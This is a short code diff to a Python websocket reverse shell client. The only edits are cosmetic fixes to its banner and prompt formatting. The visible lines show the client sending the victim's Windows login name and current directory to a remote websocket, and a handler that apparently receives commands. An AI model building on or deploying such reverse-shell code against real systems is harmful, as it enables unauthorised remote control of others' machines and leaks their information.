@@ -5,7 +5,7 @@ from threading import Thread
 
 
 """
-    | - intelligent Websocket Reverse shell Client - |
+    | - Intelligent Websocket Reverse shell Client - |
        | -  Made by NiGhTFuRy, Vaxer, MainSilent - |
         | ~ Redesign and Optimized By NiGhTFuRy ~ |
 """
@@ -96,7 +96,7 @@ def on_message(ws, cmd : str):
         print(e)
         
 def on_open(ws):
-    pwwd = cc.OKBLUE + "("+ cc.FAIL +f"{os.getlogin()}💀windows"+ cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC
+    pwwd = cc.OKBLUE + "("+ cc.FAIL + f"{os.getlogin()}💀windows" + cc.ENDC + cc.OKBLUE + ")-[" + cc.ENDC + f"{os.getcwd()}" + cc.OKBLUE + "]>" + cc.ENDC
     print(cc.OKGREEN +"[>] "+ cc.ENDC + "WebSocket connection established")
     ws.send(pwwd)
 
